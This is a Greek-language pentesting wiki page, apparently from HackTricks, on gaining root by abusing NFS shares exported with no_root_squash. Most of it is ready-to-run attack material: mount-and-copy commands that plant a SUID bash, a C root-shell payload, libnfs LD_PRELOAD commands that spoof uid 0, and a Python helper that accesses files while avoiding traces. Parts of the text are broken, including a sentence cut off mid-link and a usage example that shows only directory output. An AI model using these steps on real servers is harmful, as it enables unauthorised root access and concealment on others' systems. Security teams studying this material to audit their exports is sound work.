{{#include ../../banners/hacktricks-training.md}}

Διαβάστε το _ **/etc/exports** _ αρχείο, αν βρείτε κάποιον φάκελο που είναι ρυθμισμένος ως **no_root_squash**, τότε μπορείτε να **έχετε πρόσβαση** σε αυτόν από **ως πελάτης** και να **γράφετε μέσα** σε αυτόν τον φάκελο **σαν** να ήσασταν ο τοπικός **root** της μηχανής.

**no_root_squash**: Αυτή η επιλογή δίνει βασικά εξουσία στον χρήστη root στον πελάτη να έχει πρόσβαση σε αρχεία στον NFS server ως root. Και αυτό μπορεί να οδηγήσει σε σοβαρές επιπτώσεις ασφαλείας.

**no_all_squash:** Αυτή είναι παρόμοια με την επιλογή **no_root_squash** αλλά εφαρμόζεται σε **μη-ρίζες χρήστες**. Φανταστείτε, έχετε ένα shell ως χρήστης nobody; ελέγξατε το αρχείο /etc/exports; η επιλογή no_all_squash είναι παρούσα; ελέγξτε το αρχείο /etc/passwd; προσομοιώστε έναν μη-ρίζα χρήστη; δημιουργήστε ένα αρχείο suid ως αυτός ο χρήστης (με την τοποθέτηση χρησιμοποιώντας nfs). Εκτελέστε το suid ως χρήστης nobody και γίνετε διαφορετικός χρήστης.

# Privilege Escalation

## Remote Exploit

Αν έχετε βρει αυτή την ευπάθεια, μπορείτε να την εκμεταλλευτείτε:

- **Τοποθετώντας αυτόν τον φάκελο** σε μια μηχανή πελάτη, και **ως root αντιγράφοντας** μέσα στον τοποθετημένο φάκελο το **/bin/bash** δυαδικό και δίνοντάς του **SUID** δικαιώματα, και **εκτελώντας από τη μηχανή του θύματος** αυτό το δυαδικό bash.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
- **Τοποθετώντας αυτόν τον φάκελο** σε μια μηχανή-πελάτη, και **ως root αντιγράφοντας** μέσα στον τοποθετημένο φάκελο το προετοιμασμένο payload μας που θα εκμεταλλευτεί την άδεια SUID, δίνοντάς του **δικαιώματα SUID**, και **εκτελώντας από τη μηχανή του θύματος** αυτό το δυαδικό (μπορείτε να βρείτε εδώ μερικά [C SUID payloads](payloads-to-execute.md#c)).
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Τοπική Εκμετάλλευση

> [!NOTE]
> Σημειώστε ότι αν μπορείτε να δημιουργήσετε ένα **τούνελ από τη μηχανή σας στη μηχανή του θύματος, μπορείτε ακόμα να χρησιμοποιήσετε την απομακρυσμένη έκδοση για να εκμεταλλευτείτε αυτή την κλιμάκωση προνομίων στέλνοντας τα απαιτούμενα ports**.\
> Το παρακάτω κόλπο ισχύει στην περίπτωση που το αρχείο `/etc/exports` **υποδεικνύει μια IP**. Σε αυτή την περίπτωση **δεν θα μπορείτε να χρησιμοποιήσετε** σε καμία περίπτωση την **απομακρυσμένη εκμετάλλευση** και θα χρειαστεί να **καταχραστείτε αυτό το κόλπο**.\
> Ένα άλλο απαιτούμενο προαπαιτούμενο για να λειτουργήσει η εκμετάλλευση είναι ότι **η εξαγωγή μέσα στο `/etc/export`** **πρέπει να χρησιμοποιεί την ένδειξη `insecure`**.\
> --_Δεν είμαι σίγουρος αν το `/etc/export` υποδεικνύει μια διεύθυνση IP, αν αυτό το κόλπο θα λειτουργήσει_--

## Βασικές Πληροφορίες

Το σενάριο περιλαμβάνει την εκμετάλλευση ενός προσαρτημένου NFS share σε μια τοπική μηχανή, εκμεταλλευόμενος ένα σφάλμα στην προδιαγραφή NFSv3 που επιτρέπει στον πελάτη να καθορίσει το uid/gid του, ενδεχομένως επιτρέποντας μη εξουσιοδοτημένη πρόσβαση. Η εκμετάλλευση περιλαμβάνει τη χρήση του [libnfs](https://github.com/sahlberg
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Διεξαγωγή της Εκμετάλλευσης

Η εκμετάλλευση περιλαμβάνει τη δημιουργία ενός απλού προγράμματος C (`pwn.c`) που ανυψώνει τα δικαιώματα σε root και στη συνέχεια εκτελεί ένα shell. Το πρόγραμμα μεταγλωττίζεται και το παραγόμενο δυαδικό αρχείο (`a.out`) τοποθετείται στο κοινόχρηστο φάκελο με suid root, χρησιμοποιώντας το `ld_nfs.so` για να προσποιηθεί το uid στις κλήσεις RPC:

1. **Μεταγλωττίστε τον κώδικα εκμετάλλευσης:**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Τοποθετήστε την εκμετάλλευση στο κοινόχρηστο φάκελο και τροποποιήστε τα δικαιώματά της προσποιούμενοι το uid:**

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Εκτελέστε την εκμετάλλευση για να αποκτήσετε δικαιώματα root:**
```bash
/mnt/share/a.out
#root
```

## Μπόνους: NFShell για Διακριτική Πρόσβαση σε Αρχεία

Μόλις αποκτηθεί η πρόσβαση root, για να αλληλεπιδράσετε με το κοινόχρηστο NFS χωρίς να αλλάξετε την ιδιοκτησία (για να αποφευχθεί η αφή ίχνους), χρησιμοποιείται ένα σενάριο Python (nfsh.py). Αυτό το σενάριο προσαρμόζει το uid ώστε να ταιριάζει με αυτό του αρχείου που προσπελάζεται, επιτρέποντας την αλληλεπίδραση με αρχεία στο κοινόχρηστο φάκελο χωρίς προβλήματα δικαιωμάτων:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Τρέξτε όπως:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
